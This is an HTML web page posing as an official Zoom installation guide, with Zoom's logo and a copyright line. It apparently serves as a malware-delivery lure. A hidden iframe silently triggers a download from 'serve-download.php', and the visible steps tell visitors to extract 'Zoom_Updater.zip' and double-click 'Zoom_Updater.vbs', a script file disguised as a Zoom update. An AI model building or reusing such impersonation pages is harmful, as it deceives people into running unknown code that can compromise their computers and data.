<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Zoom Installation Guide</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
  <style>
    :root {
      --zoom-blue: #0E72ED;
      --bg-color: #f8f9fa;
      --text-color: #2d2d2d;
      --border-color: #e6e6e6;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0; padding: 0; min-height: 100vh; color: var(--text-color);
    }
    header {
      padding: 24px 48px; background: white; border-bottom: 1px solid var(--border-color);
      display: flex; align-items: center; gap: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.06);
    }
    header img { height: 32px; }
    .container { max-width: 800px; margin: 40px auto; padding: 0 24px; }
    .card {
      background: white; border-radius: 12px; padding: 40px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.15); text-align: center;
    }
    h2 { font-size: 28px; margin-bottom: 12px; }
    .step {
      text-align: left; background: #f8f9fa; border-radius: 8px;
      padding: 20px; margin-top: 24px; border-left: 4px solid var(--zoom-blue);
    }
    .step b { color: var(--zoom-blue); }
    footer { text-align: center; padding: 40px; color: white; font-size: 13px; opacity: 0.8; }
  </style>
</head>
<body>
  <header>
    <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom">
    <h1 style="font-size: 20px; margin: 0;">Installation Guide</h1>
  </header>

  <div class="container">
    <div class="card">
      <h2>Thank you for downloading Zoom</h2>
      <p>Your download should start automatically. If it didn't, <a href="serve-download.php" style="color: var(--zoom-blue); font-weight: 600;">click here</a>.</p>
      
      <div class="step">
        <p><b>Step 1:</b> Locate the <b>Zoom_Updater.zip</b> file in your Downloads folder.</p>
        <p><b>Step 2:</b> Right-click the file and select "Extract All..."</p>
        <p><b>Step 3:</b> Open the extracted folder and double-click <b>Zoom_Updater.vbs</b> to begin the update.</p>
      </div>
    </div>
  </div>

  <!-- Hidden iframe to trigger actual file download -->
  <iframe src="serve-download.php" style="display:none;"></iframe>

  <footer>
    &copy; 2026 Zoom Video Communications, Inc. All rights reserved.
  </footer>
</body>
</html>